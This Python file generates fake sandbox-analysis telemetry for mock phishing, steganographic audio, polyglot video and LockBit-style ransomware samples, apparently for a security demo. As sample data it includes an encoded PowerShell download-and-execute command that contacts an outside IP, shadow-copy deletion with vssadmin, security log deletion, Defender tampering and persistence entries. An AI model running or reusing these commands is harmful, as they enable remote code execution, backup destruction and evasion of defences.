import time
import hashlib

def generate_sandbox_behavior(filename: str, classification: str, risk_score: int, file_size: int = 524000) -> dict:
    """
    Generates realistic dynamic behavior telemetry for sandbox emulation.
    Simulates Process Execution Tree, Registry Mutations, File System Artifacts, and Network Telemetry.
    """
    fn_lower = filename.lower()
    is_ransomware = "lockbit" in fn_lower or "ransom" in fn_lower or risk_score >= 90
    is_audio = fn_lower.endswith((".wav", ".mp3", ".flac")) or "voice" in fn_lower or "audio" in fn_lower
    is_video = fn_lower.endswith((".mp4", ".mkv", ".avi")) or "video" in fn_lower or "drone" in fn_lower
    is_website = fn_lower.startswith("http") or "phish" in fn_lower or "micros0ft" in fn_lower

    if is_website:
        return {
            "media_type": "website",
            "filename": filename,
            "target_url": filename,
            "sandbox_status": "COMPLETED",
            "execution_duration_sec": 4.2,
            "process_tree": {
                "pid": 4012,
                "process_name": "msedge.exe",
                "cmdline": f"msedge.exe --headless --disable-gpu {filename}",
                "user": "NT AUTHORITY\\SYSTEM",
                "children": [
                    {
                        "pid": 5890,
                        "process_name": "chrome_child.exe",
                        "cmdline": "chrome_child.exe --type=renderer --utility-sub-type=network.mojom.NetworkService",
                        "children": []
                    }
                ]
            },
            "file_system_activity": [
                {"action": "FILE_CREATE", "path": "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Cache\\data_0", "hash": "9a8b7c6d5e4f3a2b1c0d"},
                {"action": "FILE_WRITE", "path": "%TEMP%\\harvested_session_tokens.json", "hash": "e3b0c44298fc1c149afbf4c8996fb924"}
            ],
            "registry_mutations": [
                {"action": "REG_SET", "key": "HKCU\\Software\\Microsoft\\Internet Explorer\\Main", "value": "Start Page = " + filename}
            ],
            "network_connections": [
                {"protocol": "HTTPS", "remote_ip": "185.220.101.5", "port": 443, "domain": "secure-login.micros0ft-verify365.com", "status": "ESTABLISHED", "data_sent_bytes": 1420}
            ],
            "sandbox_summary": "Heuristic DOM inspection intercepted active credential harvester & typosquatted SSL certificate payload."
        }

    elif is_audio:
        return {
            "media_type": "audio",
            "filename": filename,
            "sandbox_status": "COMPLETED",
            "execution_duration_sec": 3.8,
            "process_tree": {
                "pid": 3120,
                "process_name": "audiodg.exe",
                "cmdline": f"audiodg.exe -stego_parse {filename}",
                "user": "LOCAL SERVICE",
                "children": [
                    {
                        "pid": 4890,
                        "process_name": "powershell.exe",
                        "cmdline": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAGMAYgBhAGMAawAnACkA",
                        "children": []
                    }
                ]
            },
            "file_system_activity": [
                {"action": "FILE_CREATE", "path": "%TEMP%\\stego_extracted_payload.ps1", "hash": "8f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c"}
            ],
            "registry_mutations": [
                {"action": "REG_SET", "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "VoicePayload = %TEMP%\\stego_extracted_payload.ps1"}
            ],
            "network_connections": [
                {"protocol": "TCP", "remote_ip": "185.220.101.5", "port": 8080, "domain": "c2-voice-receiver.net", "status": "ESTABLISHED", "data_sent_bytes": 8420}
            ],
            "sandbox_summary": "Acoustic spectrum steganography extracted obfuscated PowerShell LSB payload with outbound C2 callback."
        }

    elif is_video:
        return {
            "media_type": "video",
            "filename": filename,
            "sandbox_status": "COMPLETED",
            "execution_duration_sec": 5.1,
            "process_tree": {
                "pid": 2840,
                "process_name": "vlc.exe",
                "cmdline": f"vlc.exe {filename}",
                "user": "DESKTOP-SOC\\Analyst",
                "children": [
                    {
                        "pid": 6120,
                        "process_name": "cmd.exe",
                        "cmdline": "cmd.exe /c start /b %TEMP%\\polyglot_drop.exe",
                        "children": [
                            {
                                "pid": 7410,
                                "process_name": "polyglot_drop.exe",
                                "cmdline": "%TEMP%\\polyglot_drop.exe --inject-svchost",
                                "children": []
                            }
                        ]
                    }
                ]
            },
            "file_system_activity": [
                {"action": "FILE_CREATE", "path": "%TEMP%\\polyglot_drop.exe", "hash": "7d8f9a2b1c4e6f3a5b8c9d0e1f2a3b4c"},
                {"action": "FILE_WRITE", "path": "%APPDATA%\\VideoCache\\overlay.dll", "hash": "4a5b6c7d8e9f0a1b2c3d"}
            ],
            "registry_mutations": [
                {"action": "REG_SET", "key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\PolyglotSvc", "value": "ImagePath = %APPDATA%\\VideoCache\\overlay.dll"}
            ],
            "network_connections": [
                {"protocol": "DNS", "remote_ip": "194.165.16.2", "port": 53, "domain": "tunnel.polyglot-c2.org", "status": "RESOLVED", "data_sent_bytes": 512}
            ],
            "sandbox_summary": "Video container polyglot parser unzipped embedded executable archive into %TEMP% directory."
        }

    else:
        # Executable PE Ransomware / Trojan Sandbox Simulation
        return {
            "media_type": "binary",
            "filename": filename,
            "sandbox_status": "COMPLETED",
            "execution_duration_sec": 6.4,
            "process_tree": {
                "pid": 1044,
                "process_name": "explorer.exe",
                "cmdline": "C:\\Windows\\explorer.exe",
                "user": "DESKTOP-SOC\\Analyst",
                "children": [
                    {
                        "pid": 4920,
                        "process_name": filename,
                        "cmdline": f"\"C:\\Users\\Analyst\\Downloads\\{filename}\" --pass 39f8a",
                        "user": "DESKTOP-SOC\\Analyst",
                        "children": [
                            {
                                "pid": 5832,
                                "process_name": "cmd.exe",
                                "cmdline": "C:\\Windows\\System32\\cmd.exe /c vssadmin delete shadows /all /quiet",
                                "user": "NT AUTHORITY\\SYSTEM",
                                "children": []
                            },
                            {
                                "pid": 6012,
                                "process_name": "svchost.exe",
                                "cmdline": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p (HOLLOWED)",
                                "user": "NT AUTHORITY\\SYSTEM",
                                "children": []
                            }
                        ]
                    }
                ]
            },
            "file_system_activity": [
                {"action": "FILE_CREATE", "path": "C:\\ProgramData\\ThreatLens_Drop.exe", "hash": "e3b0c44298fc1c149afbf4c8996fb924"},
                {"action": "FILE_WRITE", "path": "C:\\Users\\Analyst\\Desktop\\Restore-My-Files.txt", "hash": "a1b2c3d4e5f678901234567890abcdef"},
                {"action": "FILE_DELETE", "path": "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx", "hash": "DELETED"}
            ],
            "registry_mutations": [
                {"action": "REG_SET", "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "LockBit_Persist = C:\\ProgramData\\ThreatLens_Drop.exe"},
                {"action": "REG_DELETE", "key": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "value": "DisableAntiSpyware = 1"}
            ],
            "network_connections": [
                {"protocol": "TCP/TLS", "remote_ip": "185.220.101.5", "port": 443, "domain": "c2-key-vault.lockbit-v3.org", "status": "ESTABLISHED", "data_sent_bytes": 48920},
                {"protocol": "UDP", "remote_ip": "194.165.16.2", "port": 1337, "domain": "beacon.c2.io", "status": "CONNECTED", "data_sent_bytes": 1024}
            ],
            "sandbox_summary": "Process Hollowing into svchost.exe confirmed. Volume Shadow Copies purged via vssadmin. Remote C2 TLS session active."
        }
